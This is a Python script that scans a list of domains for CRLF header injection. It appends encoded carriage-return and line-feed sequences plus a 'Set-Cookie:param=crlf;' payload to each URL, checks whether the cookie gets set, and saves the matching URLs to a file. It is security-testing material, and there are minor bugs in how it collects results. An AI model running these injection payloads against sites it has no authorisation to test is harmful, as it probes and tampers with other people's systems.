#!/usr/bin/python

'''
# Author: Michael Stott
# Date: 11/11/17
#
# Command line tool for scanning urls for CRLF injection.
'''

import sys, getopt
import requests
import eventlet
from termcolor import colored
eventlet.monkey_patch()

# List of web protocols.
PROTOCOL_LIST = ['http', 'https']

# Append this to beginning of escape sequence.
APPEND_LIST = ["", "crlf", "?crlf=", "#"]

# List of escape sequences that possibly result in crlf.
ESCAPE_LIST = ['%0d','%0a', '%0d%0a', '%23%0d', '%23%0a', '%23%0d%0a']

# By default, the scanner will try to inject a Set-Cookie statment.
DEFAULT_INJ = "Set-Cookie:param=crlf;"

# If we don't get a response within the TIMEOUT, terminate the current scan.
TIMEOUT = 5

class CrlfScan():

    def __init__(self):
        self.inj_str = DEFAULT_INJ

    # Scan the url for crlf.
    def scan(self, url):
        # Store successful clrf attempts in buffer.
        buffer = []
        for append in APPEND_LIST:
            for escape in ESCAPE_LIST:
                crlf_url = url + append + escape + self.inj_str
                session = requests.Session()
                with eventlet.Timeout(TIMEOUT):
                    try:
                        session.get(crlf_url)
                        print(colored(crlf_url, 'magenta'))
                    except:
                        print(colored("Error: %s" % crlf_url, 'red'))
                    if 'param' in session.cookies.get_dict() and\
                        'crlf' in session.cookies.get_dict().values():
                        buffer.append(crlf_url)
        return buffer


if __name__ == "__main__":
    # Get command line arguments for input and output files.
    inputfile = ''
    outputfile = ''
    argv = sys.argv[1:]
    try:
       opts, args = getopt.getopt(argv,"hi:o:",["ifile=","ofile="])
    except getopt.GetoptError:
       print('test.py -i <inputfile> -o <outputfile>')
       sys.exit(2)
    for opt, arg in opts:
       if opt == '-h':
          print('crlf_scan.py -i <inputfile> -o <outputfile>')
          print('inputfile : The file containing all the urls to scan.')
          print('outputfile: The file containing all scan results.')
          sys.exit()
       elif opt in ("-i", "--ifile"):
          inputfile = arg
       elif opt in ("-o", "--ofile"):
          outputfile = arg
    if (not inputfile):
        print(colored('Error: require input file. (Type -h for help.)', 'red'))
        sys.exit(2)
    fp = open(inputfile)

    for i, line in enumerate(fp):    
        print(colored("Starting scan of domain %s" % line.strip(), 'green'))
        results = []
        if not line.strip():
            continue
        for p in PROTOCOL_LIST:
            try:
                url = p + '://' + line.strip()
                if not url.endswith('/'):
                    url += '/'
                print("Scanning %s." % url)
                results.extend(CrlfScan().scan(url))
            except:
                print(colored("Error occured when scanning with %s protocol." % p, 'red'))

    print(colored("Finished scanning!\n", 'green'))
    if (len(results) == 0):
        print(colored("Sorry, no crlf detected.", 'magenta'))
    else:
        print(colored("CRLF detected! Check the following urls:", 'blue'))
        if not outputfile:
            outputfile = 'crlf_results.txt'
        ofile = open(outputfile, 'w')
        for result in results:
            print>>ofile, result
            print(colored("%s" % result, 'blue'))
        ofile.close()
    fp.close()
